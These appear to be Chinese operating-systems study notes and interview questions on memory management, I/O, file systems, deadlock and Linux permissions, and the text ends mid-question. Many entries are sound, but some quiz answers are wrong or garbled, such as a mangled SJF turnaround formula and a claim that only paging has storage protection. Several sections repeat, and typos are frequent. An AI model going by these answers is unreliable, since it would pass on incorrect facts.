两者都采用离散分配方式，且都要通过地址应设机构来实现地址变换。</div><div class="line"></div><div class="line">2)         页是信息的物理单位，分页是为了有效的管理内存；段是逻辑单位，分段是为了维护信息完整性和独立性。</div><div class="line"></div><div class="line">3)         页的大小固定且由系统决定，段的长度不固定，决定于用户编写的程序。</div><div class="line"></div><div class="line">4)         分页的作业地址空间是一维的，而分段的作业地址空间是二维的。</div><div class="line"></div><div class="line">段页式存储管理方式的原理：分段和分页相结合，先将用户程序分成若干个段，再把每个段分成若干个页，并为每个段赋予一个段名。其地质结构由段号、段内页号和页内地址组成。</div><div class="line">页面置换算法有：最佳置换算法、先进先出置换算法、最近最久未使用置换算法、Clock置换算法。</div><div class="line">第五章 设备管理</div><div class="line"></div><div class="line">I/O系统是用于实现数据输入、输出及数据存储的系统。</div><div class="line">I/O设备类型：</div><div class="line">1)         特性：存储设备；输入/输出设备。</div><div class="line"></div><div class="line">2)         传输速率：低速设备；中速设备；高速设备。</div><div class="line"></div><div class="line">3)         信息交换的单位分类：块设备；字符设备。</div><div class="line"></div><div class="line">4)         共享属性：独占设备；共享设备；虚拟设备。</div><div class="line"></div><div class="line">设备与控制器之间的接口：</div><div class="line">1)         数据信号线：设备和设备控制器之间传送数据信号</div><div class="line"></div><div class="line">2)         控制信号线：设备控制器向I/O设备发送控制信号的通路</div><div class="line"></div><div class="line">3)         状态信号线：传送指示设备当前状态的信号。</div><div class="line"></div><div class="line">设备控制器</div><div class="line">主要职责是控制一个或多个I/O设备，以实现I/O设备和计算机之间的数据交换。是CPU和I/O设备的接口，他接受CPU指令去控制I/O设备工作，使减轻处理机的工作量。</div><div class="line"></div><div class="line">设备控制器包括控制字符设备控制器和控制块设备的控制器。</div><div class="line"></div><div class="line">设备控制器的基本功能</div><div class="line">1)         接受和识别命令</div><div class="line"></div><div class="line">2)         数据交换</div><div class="line"></div><div class="line">3)         标识和报告设备的状态</div><div class="line"></div><div class="line">4)         地址识别（CPU通过地质控制设备）</div><div class="line"></div><div class="line">5)         数据缓冲</div><div class="line"></div><div class="line">6)         差错控制</div><div class="line"></div><div class="line">I/O通道是一种特殊的处理机，它具有执行I/O指令的能力，可以控制I/O操作。类型分为：字节多路通道、数组选择通道、数组多路通道。</div><div class="line">解决“瓶颈”问题的最有效的方法是增加设备到主机间的通路而不增加通道。</div><div class="line">I/O控制方式</div><div class="line">1)         程序I/O方式</div><div class="line"></div><div class="line">2)         中断驱动I/O控制方式</div><div class="line"></div><div class="line">3)         直接存储器访问（DMA）I/O控制方式</div><div class="line"></div><div class="line">4)         I/O通道控制方式</div><div class="line"></div><div class="line">SPOOLing技术</div><div class="line">通过SPOOLing技术便可将一台物理I/O设备虚拟为多台逻辑I/O设备，同样允许多个用户共享一台物理I/O设备。</div><div class="line"></div><div class="line">Spooling系统的组成</div><div class="line">输入井和输入井；输入缓冲区和输出缓冲区；输入进程和输出进程。</div><div class="line"></div><div class="line">SPOOLing系统的特点</div><div class="line">1)         提高了I/O的速度</div><div class="line"></div><div class="line">2)         将独占设备改造为共享设备</div><div class="line"></div><div class="line">3)         实现了虚拟设备功能</div><div class="line"></div><div class="line">磁盘调度</div><div class="line">磁盘调度的主要目标是使磁盘的平均寻道时间最少。</div><div class="line"></div><div class="line">常用的磁盘调度算法</div><div class="line">1)         先来先服务（适合进程较少的场合）</div><div class="line"></div><div class="line">2)         最短寻道时间优先（要访问的磁道与当前磁头所在磁道距离最近。会导致进程“饥饿”现象）</div><div class="line"></div><div class="line">3)         扫描算法（考虑访问的磁道与当前磁头所在磁道距离最近和磁头当前移动的方向）</div><div class="line"></div><div class="line">4)         循环扫描算法（规定磁头单向移动）</div><div class="line"></div><div class="line">5)         NSPetpSCAN和FSCAN调度算法</div><div class="line"></div><div class="line">                                                                                                                                                                                                第六章 文件管理</div><div class="line"></div><div class="line">文件逻辑结构的类型</div><div class="line">1)  有结构文件（由一个以上的记录构成的文件，又称记录式文件）</div><div class="line"></div><div class="line">2)  无结构文件（由字符流构成的文件，又称流式文件）</div><div class="line"></div><div class="line">记录式文件的长度分为定长记录和变长记录。</div><div class="line">记录文件又分为顺序文件、索引文件、索引顺序文件。</div><div class="line">大量的数据结构而后数据库是采用有结构的文件形式</div><div class="line">而大量的源代码、可执行文件、库函数等采用无结构文件。</div><div class="line"></div><div class="line">顺序文件的优缺点</div><div class="line">1)         适合进行批量存取</div><div class="line"></div><div class="line">2)         存取效率是所有逻辑文件中最高的</div><div class="line"></div><div class="line">3)         也只有顺序文件才能存储在磁带上，并能有效的工作</div><div class="line"></div><div class="line">4)         不适合查找或修改单个记录</div><div class="line"></div><div class="line">5)         增加或删除一个记录时比较困难</div><div class="line"></div><div class="line">索引文件的缺点：除了有主文件外，还须配置一张索引表，而且每个记录都要有一个索引表，因此提高了存储费用。</div><div class="line">对已直接文件，检索时可以根据记录键值直接获得指定记录的物理地址。</div><div class="line">哈希文件是键值通过Hash函数指向目录表，该表目的内容指向记录所在的物理块。</div><div class="line">外存分配方式：连续分配、连接分配和索引分配三种。</div><div class="line">连续分配的优缺点</div><div class="line">1)         顺序访问容易</div><div class="line"></div><div class="line">2)         顺序访问速度快</div><div class="line"></div><div class="line">缺点：</div><div class="line"></div><div class="line">1)         要求有连续的存储空间</div><div class="line"></div><div class="line">2)         必须实现知道文件的长度</div><div class="line"></div><div class="line">链接分配中的链接方式分为隐式链接和显式链接。</div><div class="line">为新建文件分配存储空间的方式分为连续和离散的分配方式。前置具有较高的文件访问速度，但可能产生较多的外存零头。后者能有效的利用外存空间，但访问速度较慢。无论哪种方式，存储空间的基本分配单位都是磁盘块而非字节。</div><div class="line">文件存储空间管理的方法</div><div class="line">1)         空闲表法和空闲链表法</div><div class="line"></div><div class="line">2)         位示图法</div><div class="line"></div><div class="line">3)         成组链接法</div><div class="line"></div><div class="line">空闲表法和空闲链表法都不适用于大型文件系统可使用成组链接法。</div><div class="line"></div><div class="line">常见面试题：</div><div class="line">1、进程是并发过程中程序的执行过程</div><div class="line">2、进程的特征：结构特征动态性并发性独立性异步性</div><div class="line">3、临界区指在每个进程中访问临界资源的那段代码</div><div class="line">4，现在操作系统中申请资源的基本单位是进程，在CPU得到执行的基本单位是线程，进程是由程序段、数据段、PCB组成的</div><div class="line">5，对临界资源应采取互斥访问方式来实现共享</div><div class="line">6，P.V操作是一种低级进程通信原语</div><div class="line">7，对于记录性信号量，在执行一次P操作时，信号量的值应当减1，当其值为小于0时进程应阻塞；在执行V操作时，信号量的值应当加1；当其值小于等于0时，应唤醒阻塞队列中的进程。</div><div class="line">8，N个进程共享某一临界资源，（n-1）~1</div><div class="line">9，短作业优先算法，T1&lt;T2&lt;T3平均周转时间为：T1+2XT2/3+T3/3</div><div class="line">10，响应比Rp=（等待时间+要求服务时间）/要求服务器时间=响应时间/要求服务时间</div><div class="line">11死锁是指多个进程在运行过程中因争夺资源，而造成的一种僵局，当进程处于这种僵局状态时，若无外力作用，他们都将无法再向前推进。</div><div class="line">死锁的避免是根据防止系统进入不安全状态。</div><div class="line">产生死锁的根本原因是资源分配不当和资源数量不足，发生死锁的四个必要条件是：互斥条件，请求和保持条件，不剥夺条件和环路等待条件，银行家算法用于避免死锁</div><div class="line">12，如果系统中有N个进程，最多为（N-1）个</div><div class="line">13，若系统采用轮转法调度进程系统采用的是剥夺式调度</div><div class="line">14，既考虑作业等待时间，又考虑作业执行时间，的调度算法是响应比优先调度算法</div><div class="line">15，资源的有序分配策略可以破坏死锁的“循环等待”</div><div class="line">16，并非所有的不安全状态都必然会转为死锁状态，但当系统进图不安全按状态后变有可能进入死锁状态，</div><div class="line">17，重定位：在作业地址空间中使用的逻辑地址变为内存物理地址</div><div class="line">18，支持程序放在不连续内存中储存管理方法有分取式分配，分段式分配，段页式分配页式存储主要特点是不要将作业同时全部装入到主存的的连续区域</div><div class="line">19，适合多道程序运行的存储管理中，存储保护是为了防止各道作业的相互干扰</div><div class="line">20，采用页式存储管理时，重定位的工作由地址转换机</div><div class="line">21，段页式存储管理中的地址映像表是每个作业或进程一张段表，每个段一张页表</div><div class="line">22，在虚拟页式存储管理方案中，完成将页面调入内存的工作的是缺页中断处理</div><div class="line">23，分段管理和分页管理的主要区别是分页管理有存储保护，分段管理没有</div><div class="line">24，在股低估分区分配中，可以不同但预先固定的</div><div class="line">25，不使用中断机构的I/O控制方式是程序I/O方式</div><div class="line">26，spooling技术能独占设备改造成可以共享的虚拟设备  </div><div class="line">27，磁盘防伪中把数据从磁盘读出，叫做传输时间</div><div class="line">28，共享设备指同一时间内运行多个进程同时访问的设备</div><div class="line">29，通过软件的功能扩充，把原来独占的设备爱造成若干个可共享的设备，虚拟设备</div><div class="line">30，DMA方式如果I/O设备不通过CPU来完成</div><div class="line">31，设备独立性用户程序独立于具体物理设备的一种特性</div><div class="line">32，虚拟设备一个物理设备变换成多个对应的逻辑设备</div><div class="line">33，通道是一种特殊的处理机，通道按传递数据的方式分为：字节多路通道，数组选择通道，数组多路通道</div><div class="line">通道涉及的数据结构是设备控制器，控制器控制块，通道控制块，系统设备表</div><div class="line">34，磁盘高速缓冲设在内存中，目的是提高I/O磁盘速度</div><div class="line">35，磁盘空间的地址有盘面号，柱面号，扇区号组成。访问磁盘的时间有 寻道时间，旋转等待时间，读写时间 </div><div class="line">36，将系统段用参数翻译成设备操作命令的工作由设备无关的操作系统完成</div><div class="line">37，向设备寄存器写入控制命令由设备驱动程序完成</div><div class="line">38，寻找设备驱动程序由设备无关的操作系统软件完成</div><div class="line">39，设备管理的功能是设备分配，缓冲区管理和实现物理I/O设备的操作</div><div class="line">40，根据设备的固有属性特点，设备可分为独占设备，共享设备和虚拟设备</div><div class="line">41，引入缓冲区技术可提高处理器执行程序和设备的输入输出操作的并行程序文件管理</div><div class="line">42，物理文件的组织方式是由操作系统确定的，文件的顺序存取是按文件的逻辑号逐一存取</div><div class="line">43，系统通过树形目录结构来解决重名问题</div><div class="line">44，在UNIX操作系统中，把输入输出设备看做特殊文件</div><div class="line">45，打开文件操作的主要工作是把指定的目录复制到内存指定区域</div><div class="line">46，文件路径名是指从根目录到该文件所经历的路径中各符号名的集合</div><div class="line">47，按逻辑结构划分，文件主要有两类：记录是文件，流式文件，文件系统的主要目的是实现对文件的按名存取</div><div class="line">48连续结构文件必须采用连续分配方式，而链接结构文件和索引结构文件都可采取离散分配方式</div><div class="line">49，文件系统中，若文件的物理结构采用连续结构有关文件的物理位置的信息包括首块地址和文件长度</div><div class="line">50，位示图可用于磁盘空间管理，在文件系统中，为实现文件保护，一般采用口令，密码和访问控制div><div class="line">1、进程是具有独立功能程序在某个数据集合上的一次执行过程。线程是进程内的一个执行实体或执行单元。</div><div class="line">进程和线程的区别：</div><div class="line">（a）不同进程的地址空间是独立的，而同一进程内的线程共享同一地址空间。一个进程的线程在另一个进程内是不可见的。</div><div class="line">（b） 在引入线程的操作系统中，进程是资源分配和调度的单位，线程是处理机调度和分配的单位，资源是分配给进程的，线程只拥有很少资源，因而切换代价比进程切换低。</div><div class="line"></div><div class="line">2、死锁在多道程序系统中，当一组进程中的每个进程均无限期地等待被改组进程中的另一进程所占有且永远不会释放的资源，此时的系统处于死锁状态。</div><div class="line">死锁产生的原因：</div><div class="line">（a）系统提供的资源有限；</div><div class="line">（b）进程推进顺序不当。</div><div class="line">产生死锁的必要条件：互斥条件、不可剥夺条件、请求和保持条件、循环等待条件</div><div class="line"></div><div class="line">3、执行如下访问页号序列： 1，2，3，4，1，2，5，1，2，3，4，5 试说明采用先进（1）FIFO: 9次（2）LRU：10次 （3）OPT：7次   </div><div class="line"></div><div class="line">4、什么是操作系统的基本功能?</div><div class="line">1.处理机管理。在多道程序或多用户的情况下，要组织多个作业同时运行，就要解决对处理机分配调度策略、分配实施和资源回收等问题。</div><div class="line">2.存储管理。存储管理的主要工作是对内部存储器进行分配、保护和扩充和管理。</div><div class="line">3.设备管理。涉及到通道、控制器、输入输出设备的分配和管理以及设备独立性。</div><div class="line">4.信息管理(文件系统管理) 是对系统的软件资源的管理。</div><div class="line">5.用户接口。操作系统还为用户提供一个友好的用户接口。一般来说，操作系统提供两种方式的接口来为用户服务。</div><div class="line"></div><div class="line">5、分级调度分为4级：</div><div class="line">(1) 作业调度</div><div class="line">(2) 交换调度</div><div class="line">(3) 进程调度 </div><div class="line">(4) 线程调度。</div><div class="line"></div><div class="line">6、试写出程序与进程的区别</div><div class="line">（1）进程是一个动态概念，而程序是一个静态概念。</div><div class="line">（2）进程具有并行特征，而程序不反映执行所以没有并行特征</div><div class="line">（3）进程是竞争计算机系统资源的基本单位，而程序不反映执行也就不会竞争计算机系统资源</div><div class="line">（4）不同的进程可以包含同一程序，只要该程序所对应的数据集不同。 </div><div class="line"></div><div class="line">7、页式管理的基本原理是什么?</div><div class="line">（1）进程的虚拟空间被划分成长度相等的页。</div><div class="line">（2）内存空间也按页的大小划分成长度相等的页面。</div><div class="line">（3）采用请求调页或预调技术实现内外存储器的统一管理。</div><div class="line"></div><div class="line">8、进程调度有哪些功能?</div><div class="line">（1）记录系统中所有进程的执行情况。</div><div class="line">（2）选择占有处理机的进程</div><div class="line">（3）进行进程上下文切换</div><div class="line"></div><div class="line">9、批处理操作系统、分时操作系统和实时操作系统的特点各是什么？</div><div class="line">(1) 批处理操作系统的特点：成批处理，系统吞吐量高，资源利用率高，用户不能直接干预作业的执行。</div><div class="line">(2)分时操作系统的特点：多路性、独立性、及时性、交互性。</div><div class="line">(3)实时操作系统的特点：及时响应、快速处理；高可靠性和安全性；不要求系统资源利用率。</div><div class="line">10、Windows下的内存是如何管理的？</div><div class="line"></div><div class="line">　　Windows提供了3种方法来进行内存管理：虚拟内存，最适合用来管理大型对象或者结构数组；内存映射文件，最适合用来管理大型数据流（通常来自文件）以及在单个计算机上运行多个进程之间共享数据；内存堆栈，最适合用来管理大量的小对象。</div><div class="line"></div><div class="line">　　Windows操纵内存可以分两个层面：物理内存和虚拟内存。</div><div class="line"></div><div class="line">　　其中物理内存由系统管理，不允许应用程序直接访问，应用程序可见的只有一个2G地址空间，而内存分配是通过堆进行的。对于每个进程都有自己的默认堆，当一个堆创建后，就通过虚拟内存操作保留了相应大小的地址块（不占有实际的内存，系统消耗很小）。当在堆上分配一块内存时，系统在堆的地址表里找到一个空闲块（如果找不到，且堆创建属性是可扩充的，则扩充堆大小），为这个空闲块所包含的所有内存页提交物理对象（在物理内存上或硬盘的交换文件上），这时就可以访问这部分地址。提交时，系统将对所有进程的内存统一调配，如果物理内存不够，系统试图把一部分进程暂时不访问的页放入交换文件，以腾出部分物理内存。释放内存时，只在堆中将所在的页解除提交（相应的物理对象被解除），继续保留地址空间。</div><div class="line"></div><div class="line">　　如果要知道某个地址是否被占用/可不可以访问，只要查询此地址的虚拟内存状态即可。如果是提交，则可以访问。如果仅仅保留，或没保留，则产生一个软件异常。此外，有些内存页可以设置各种属性。如果是只读，向内存写也会产生软件异常。</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">11、Windows消息调度机制是（C）</div><div class="line"></div><div class="line">　　A）指令队列；B）指令堆栈；C）消息队列；D）消息堆栈</div><div class="line"></div><div class="line">解析：</div><div class="line"></div><div class="line">　　处理消息队列的顺序。首先Windows绝对不是按队列先进先出的次序来处理的，而是有一定优先级的。优先级通过消息队列的状态标志来实现的。首先，最高优先级的是别的线程发过来的消息（通过sendmessage）；其次，处理登记消息队列消息；再次处理QS_QUIT标志，处理虚拟输入队列，处理wm_paint；最后是wm_timer。</div><div class="line"></div><div class="line"></div><div class="line">12、描述实时系统的基本特性</div><div class="line"></div><div class="line">　　在特定时间内完成特定的任务，实时性与可靠性。</div><div class="line"></div><div class="line">　　所谓“实时操作系统”，实际上是指操作系统工作时，其各种资源可以根据需要随时进行动态分配。由于各种资源可以进行动态分配，因此，其处理事务的能力较强、速度较快。</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">13、中断和轮询的特点</div><div class="line"></div><div class="line">　　对I/O设备的程序轮询的方式，是早期的计算机系统对I/O设备的一种管理方式。它定时对各种设备轮流询问一遍有无处理要求。轮流询问之后，有要求的，则加以处理。在处理I/O设备的要求之后，处理机返回继续工作。尽管轮询需要时间，但轮询要比I/O设备的速度要快得多，所以一般不会发生不能及时处理的问题。当然，再快的处理机，能处理的输入输出设备的数量也是有一定限度的。而且，程序轮询毕竟占据了CPU相当一部分处理时间，因此，程序轮询是一种效率较低的方式，在现代计算机系统中已很少应用。</div><div class="line"></div><div class="line">　　程序中断通常简称中断，是指CPU在正常运行程序的过程中，由于预先安排或发生了各种随机的内部或外部事件，使CPU中断正在运行的程序，而转到为响应的服务程序去处理。</div><div class="line"></div><div class="line">　　轮询——效率低，等待时间很长，CPU利用率不高。</div><div class="line"></div><div class="line">　　中断——容易遗漏一些问题，CPU利用率高。</div><div class="line"></div><div class="line">14、什么是临界区？如何解决冲突？</div><div class="line"></div><div class="line">　　每个进程中访问临界资源的那段程序称为临界区，每次只准许一个进程进入临界区，进入后不允许其他进程进入。</div><div class="line"></div><div class="line">　　（1）如果有若干进程要求进入空闲的临界区，一次仅允许一个进程进入；</div><div class="line"></div><div class="line">　　（2）任何时候，处于临界区内的进程不可多于一个。如已有进程进入自己的临界区，则其它所有试图进入临界区的进程必须等待；</div><div class="line"></div><div class="line">　　（3）进入临界区的进程要在有限时间内退出，以便其它进程能及时进入自己的临界区；</div><div class="line"></div><div class="line">　　（4）如果进程不能进入自己的临界区，则应让出CPU，避免进程出现“忙等”现象。</div><div class="line"></div><div class="line"></div><div class="line">15、说说分段和分页</div><div class="line"></div><div class="line">　　页是信息的物理单位，分页是为实现离散分配方式，以消减内存的外零头，提高内存的利用率；或者说，分页仅仅是由于系统管理的需要，而不是用户的需要。</div><div class="line"></div><div class="line">　　段是信息的逻辑单位，它含有一组其意义相对完整的信息。分段的目的是为了能更好的满足用户的需要。</div><div class="line"></div><div class="line">　　页的大小固定且由系统确定，把逻辑地址划分为页号和页内地址两部分，是由机器硬件实现的，因而一个系统只能有一种大小的页面。段的长度却不固定，决定于用户所编写的程序，通常由编辑程序在对源程序进行编辑时，根据信息的性质来划分。</div><div class="line"></div><div class="line">　　分页的作业地址空间是一维的，即单一的线性空间，程序员只须利用一个记忆符，即可表示一地址。分段的作业地址空间是二维的，程序员在标识一个地址时，既需给出段名，又需给出段内地址。</div><div class="line"></div><div class="line"></div><div class="line">16、说出你所知道的保持进程同步的方法？</div><div class="line"></div><div class="line">　　进程间同步的主要方法有原子操作、信号量机制、自旋锁、管程、会合、分布式系统等。</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">17、Linux中常用到的命令</div><div class="line"></div><div class="line">　　显示文件目录命令ls        如ls</div><div class="line"></div><div class="line">　　改变当前目录命令<span class="built_in">cd</span>        如<span class="built_in">cd</span> /home</div><div class="line"></div><div class="line">　　建立子目录mkdir           如mkdir xiong</div><div class="line"></div><div class="line">　　删除子目录命令rmdir       如rmdir /mnt/cdrom</div><div class="line"></div><div class="line">　　删除文件命令rm            如rm /ucdos.bat</div><div class="line"></div><div class="line">　　文件复制命令cp            如cp /ucdos /fox</div><div class="line"></div><div class="line">　　获取帮助信息命令man      如man ls</div><div class="line"></div><div class="line">　　显示文件的内容less        如less mwm.lx</div><div class="line"></div><div class="line">　　重定向与管道<span class="built_in">type</span>          如<span class="built_in">type</span> readme&gt;&gt;direct，将文件readme的内容追加到文direct中</div><div class="line"></div><div class="line">18、Linux文件属性有哪些？（共十位）</div><div class="line"></div><div class="line">　　-rw-r--r--那个是权限符号，总共是- --- --- ---这几个位。</div><div class="line"></div><div class="line">　　第一个短横处是文件类型识别符：-表示普通文件；c表示字符设备（character）；b表示块设备（block）；d表示目录（directory）；l表示链接文件（link）；后面第一个三个连续的短横是用户权限位（User），第二个三个连续短横是组权限位（Group），第三个三个连续短横是其他权限位（Other）。每个权限位有三个权限，r（读权限），w（写权限），x（执行权限）。如果每个权限位都有权限存在，那么满权限的情况就是：-rwxrwxrwx；权限为空的情况就是- --- --- ---。</div><div class="line"></div><div class="line">　　权限的设定可以用chmod命令，其格式位：chmod ugoa+/-/=rwx filename/directory。例如：</div><div class="line"></div><div class="line">　　一个文件aaa具有完全空的权限- --- --- ---。</div><div class="line"></div><div class="line">　　chmod u+rw aaa（给用户权限位设置读写权限，其权限表示为：- rw- --- ---）</div><div class="line"></div><div class="line">　　chmod g+r aaa（给组设置权限为可读，其权限表示为：- --- r-- ---）</div><div class="line"></div><div class="line">　　chmod ugo+rw aaa（给用户，组，其它用户或组设置权限为读写，权限表示为：- rw- rw- rw-）</div><div class="line"></div><div class="line">　　如果aaa具有满权限- rwx rwx rwx。</div><div class="line"></div><div class="line">　　chmod u-x aaa（去掉用户可执行权限，权限表示为：- rw- rwx rwx）</div><div class="line"></div><div class="line">　　如果要给aaa赋予制定权限- rwx r-x r-x，命令为：</div><div class="line"></div><div class="line">　　chmod u=rwx，go=rx aaa</div><div class="line"></div><div class="line"></div><div class="line">19、简术OSI的物理层Layer1，链路层Layer2，网络层Layer3的任务。</div><div class="line"></div><div class="line">　　网络层：通过路由选择算法，为报文或分组通过通信子网选择最适当的路径。</div><div class="line"></div><div class="line">　　链路层：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</div><div class="line"></div><div class="line">　　物理层：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。</div><div class="line"></div><div class="line"></div><div class="line">20、什么是中断？中断时CPU做什么工作？</div><div class="line"></div><div class="line">　　中断是指在计算机执行期间，系统内发生任何非寻常的或非预期的急需处理事件，使得CPU暂时中断当前正在执行的程序而转去执行相应的事件处理程序。待处理完毕后又返回原来被中断处继续执行或调度新的进程执行的过程。</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">21、你知道操作系统的内容分为几块吗？什么叫做虚拟内存？他和主存的关系如何？内存管理属于操作系统的内容吗？</div><div class="line"></div><div class="line">　　操作系统的主要组成部分：进程和线程的管理，存储管理，设备管理，文件管理。虚拟内存是一些系统页文件，存放在磁盘上，每个系统页文件大小为4K，物理内存也被分页，每个页大小也为4K，这样虚拟页文件和物理内存页就可以对应，实际上虚拟内存就是用于物理内存的临时存放的磁盘空间。页文件就是内存页，物理内存中每页叫物理页，磁盘上的页文件叫虚拟页，物理页+虚拟页就是系统所有使用的页文件的总和。</div><div class="line"></div><div class="line"></div><div class="line">22、线程是否具有相同的堆栈？dll是否有独立的堆栈？</div><div class="line"></div><div class="line">　　每个线程有自己的堆栈。</div><div class="line"></div><div class="line">　　dll是否有独立的堆栈？这个问题不好回答，或者说这个问题本身是否有问题。因为dll中的代码是被某些线程所执行，只有线程拥有堆栈。如果dll中的代码是exe中的线程所调用，那么这个时候是不是说这个dll没有独立的堆栈？如果dll中的代码是由dll自己创建的线程所执行，那么是不是说dll有独立的堆栈？</div><div class="line"></div><div class="line">　　以上讲的是堆栈，如果对于堆来说，每个dll有自己的堆，所以如果是从dll中动态分配的内存，最好是从dll中删除；如果你从dll中分配内存，然后在exe中，或者另外一个dll中删除，很有可能导致程序崩溃。</div><div class="line"></div><div class="line"></div><div class="line">23、什么是缓冲区溢出？有什么危害？其原因是什么？</div><div class="line"></div><div class="line">　　缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。</div><div class="line"></div><div class="line">　　危害：在当前网络与分布式系统安全中，被广泛利用的50%以上都是缓冲区溢出，其中最著名的例子是1988年利用fingerd漏洞的蠕虫。而缓冲区溢出中，最为危险的是堆栈溢出，因为入侵者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，带来的危害一种是程序崩溃导致拒绝服务，另外一种就是跳转并且执行一段恶意代码，比如得到shell，然后为所欲为。通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程序的堆栈，使程序转而执行其它指令，以达到攻击的目的。</div><div class="line"></div><div class="line">　　造成缓冲区溢出的主原因是程序中没有仔细检查用户输入的参数。</div><div class="line"></div><div class="line">24、什么是死锁？其条件是什么？怎样避免死锁？</div><div class="line"></div><div class="line">　　死锁的概念：在两个或多个并发进程中，如果每个进程持有某种资源而又都等待别的进程释放它或它们现在保持着的资源，在未改变这种状态之前都不能向前推进，称这一组进程产生了死锁。通俗地讲，就是两个或多个进程被无限期地阻塞、相互等待的一种状态。</div><div class="line"></div><div class="line">　　死锁产生的原因主要是：</div><div class="line"></div><div class="line">       （1）系统资源不足；</div><div class="line"></div><div class="line">       （2） 进程推进顺序非法。</div><div class="line"></div><div class="line">　　产生死锁的必要条件：</div><div class="line"></div><div class="line">　　（1）互斥（mutualexclusion），一个资源每次只能被一个进程使用；</div><div class="line"></div><div class="line">　　（2）不可抢占（nopreemption），进程已获得的资源，在未使用完之前，不能强行剥夺；</div><div class="line"></div><div class="line">　　（3）占有并等待（hold andwait），一个进程因请求资源而阻塞时，对已获得的资源保持不放；</div><div class="line"></div><div class="line">　　（4）环形等待（circularwait），若干进程之间形成一种首尾相接的循环等待资源关系。</div><div class="line"></div><div class="line">　　这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之一不满足，就不会发生死锁。</div><div class="line"></div><div class="line">　　死锁的解除与预防：理解了死锁的原因，尤其是产生死锁的四个必要条件，就可以最大可能地避免、预防和解除死锁。所以，在系统设计、进程调度等方面注意如何不让这四个必要条件成立，如何确定资源的合理分配算法，避免进程永久占据系统资源。此外，也要防止进程在处于等待状态的情况下占用资源。因此，对资源的分配要给予合理的规划。</div><div class="line"></div><div class="line">　　死锁的处理策略：鸵鸟策略、预防策略、避免策略、检测与恢复策略。</div><div class="line"></div><div class="line"></div><div class="line">附录：</div><div class="line">1、什么是进程（Process）和线程（Thread）？有何区别？</div><div class="line"></div><div class="line">　　进程是具有一定独立功能的程序关于某个数据集合上的一次运行活动，进程是系统进行资源分配和调度的一个独立单位。线程是进程的一个实体，是CPU调度和分派的基本单位，它是比进程更小的能独立运行的基本单位。线程自己基本上不拥有系统资源，只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一个进程中的多个线程之间可以并发执行。</div><div class="line"></div><div class="line">　　进程与应用程序的区别在于应用程序作为一个静态文件存储在计算机系统的硬盘等存储空间中，而进程则是处于动态条件下由操作系统维护的系统资源管理实体。</div><div class="line"></div><div class="line">　　2、Windows下的内存是如何管理的？</div><div class="line"></div><div class="line">　　Windows提供了3种方法来进行内存管理：虚拟内存，最适合用来管理大型对象或者结构数组；内存映射文件，最适合用来管理大型数据流（通常来自文件）以及在单个计算机上运行多个进程之间共享数据；内存堆栈，最适合用来管理大量的小对象。</div><div class="line"></div><div class="line">　　Windows操纵内存可以分两个层面：物理内存和虚拟内存。</div><div class="line"></div><div class="line">　　其中物理内存由系统管理，不允许应用程序直接访问，应用程序可见的只有一个2G地址空间，而内存分配是通过堆进行的。对于每个进程都有自己的默认堆，当一个堆创建后，就通过虚拟内存操作保留了相应大小的地址块（不占有实际的内存，系统消耗很小）。当在堆上分配一块内存时，系统在堆的地址表里找到一个空闲块（如果找不到，且堆创建属性是可扩充的，则扩充堆大小），为这个空闲块所包含的所有内存页提交物理对象（在物理内存上或硬盘的交换文件上），这时就可以访问这部分地址。提交时，系统将对所有进程的内存统一调配，如果物理内存不够，系统试图把一部分进程暂时不访问的页放入交换文件，以腾出部分物理内存。释放内存时，只在堆中将所在的页解除提交（相应的物理对象被解除），继续保留地址空间。</div><div class="line"></div><div class="line">　　如果要知道某个地址是否被占用/可不可以访问，只要查询此地址的虚拟内存状态即可。如果是提交，则可以访问。如果仅仅保留，或没保留，则产生一个软件异常。此外，有些内存页可以设置各种属性。如果是只读，向内存写也会产生软件异常。</div><div class="line"></div><div class="line">　　3、Windows消息调度机制是？</div><div class="line"></div><div class="line">　　A）指令队列；B）指令堆栈；C）消息队列；D）消息堆栈</div><div class="line"></div><div class="line">　　答案：C</div><div class="line"></div><div class="line">　　处理消息队列的顺序。首先Windows绝对不是按队列先进先出的次序来处理的，而是有一定优先级的。优先级通过消息队列的状态标志来实现的。首先，最高优先级的是别的线程发过来的消息（通过sendmessage）；其次，处理登记消息队列消息；再次处理QS_QUIT标志，处理虚拟输入队列，处理wm_paint；最后是wm_timer。</div><div class="line"></div><div class="line">　　4、描述实时系统的基本特性</div><div class="line"></div><div class="line">　　在特定时间内完成特定的任务，实时性与可靠性。</div><div class="line"></div><div class="line">　　所谓“实时操作系统”，实际上是指操作系统工作时，其各种资源可以根据需要随时进行动态分配。由于各种资源可以进行动态分配，因此，其处理事务的能力较强、速度较快。</div><div class="line"></div><div class="line">　　5、中断和轮询的特点</div><div class="line"></div><div class="line">　　对I/O设备的程序轮询的方式，是早期的计算机系统对I/O设备的一种管理方式。它定时对各种设备轮流询问一遍有无处理要求。轮流询问之后，有要求的，则加以处理。在处理I/O设备的要求之后，处理机返回继续工作。尽管轮询需要时间，但轮询要比I/O设备的速度要快得多，所以一般不会发生不能及时处理的问题。当然，再快的处理机，能处理的输入输出设备的数量也是有一定限度的。而且，程序轮询毕竟占据了CPU相当一部分处理时间，因此，程序轮询是一种效率较低的方式，在现代计算机系统中已很少应用。</div><div class="line"></div><div class="line">　　程序中断通常简称中断，是指CPU在正常运行程序的过程中，由于预先安排或发生了各种随机的内部或外部事件，使CPU中断正在运行的程序，而转到为响应的服务程序去处理。</div><div class="line"></div><div class="line">　　轮询——效率低，等待时间很长，CPU利用率不高。</div><div class="line"></div><div class="line">　　中断——容易遗漏一些问题，CPU利用率高。</div><div class="line"></div><div class="line">6、什么是临界区？如何解决冲突？</div><div class="line"></div><div class="line">　　